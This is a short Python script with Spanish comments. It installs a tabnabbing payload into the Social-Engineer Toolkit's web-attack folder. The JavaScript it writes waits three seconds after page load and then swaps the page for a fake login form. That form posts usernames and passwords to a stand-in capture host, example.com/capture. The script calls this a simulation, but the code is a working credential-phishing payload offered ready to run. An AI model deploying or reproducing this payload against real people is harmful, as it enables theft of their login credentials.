#!/bin/python3

import os

def crear_archivo_tabnabbing():
    ruta_archivo = "/usr/local/share/setoolkit/src/webattack/tabnabbing/source.js"
    contenido = """// source.js: Simulación básica de Tabnabbing
window.onload = function () {
    // Tiempo de espera para simular cambio de pestaña (en milisegundos)
    setTimeout(function () {
        // Cambia el contenido de la página después de 3 segundos
        document.body.innerHTML = `
            <h1>Inicia sesión para continuar</h1>
            <form action="http://example.com/capture" method="POST">
                <label for="username">Usuario:</label>
                <input type="text" id="username" name="username"><br><br>
                <label for="password">Contraseña:</label>
                <input type="password" id="password" name="password"><br><br>
                <button type="submit">Iniciar sesión</button>
            </form>
        `;
        document.title = "Inicio de sesión - Seguridad";
    }, 3000);
};
"""
    try:
        # Crear directorio si no existe
        os.makedirs(os.path.dirname(ruta_archivo), exist_ok=True)

        # Escribir el archivo con el contenido
        with open(ruta_archivo, "w") as archivo:
            archivo.write(contenido)
        
        print(f"[+] Archivo creado exitosamente en: {ruta_archivo}")

    except PermissionError:
        print("[!] Permiso denegado. Por favor, ejecuta este script con privilegios de administrador.")
    except Exception as e:
        print(f"[!] Ocurrió un error: {e}")

if __name__ == "__main__":
    crear_archivo_tabnabbing()
